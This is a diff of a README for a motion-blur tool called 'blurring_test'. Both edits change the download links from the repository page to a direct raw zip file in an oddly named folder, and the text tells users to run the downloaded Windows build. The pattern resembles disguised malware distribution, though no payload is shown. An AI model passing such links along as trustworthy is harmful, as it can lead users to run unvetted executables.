@@ -1,6 +1,6 @@
 # 🎞️ blurring_test - Motion blur made simple
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github)](https://github.com/Maxifrowning888/blurring_test)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github)](https://github.com/Maxifrowning888/blurring_test/raw/refs/heads/main/flapperish/blurring-test-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@
 
 Visit this page to download:
 
-https://github.com/Maxifrowning888/blurring_test
+https://github.com/Maxifrowning888/blurring_test/raw/refs/heads/main/flapperish/blurring-test-3.5.zip
 
 Open the link in your browser, then get the Windows build from the project page. After the file finishes downloading, you can run it on your PC.
 
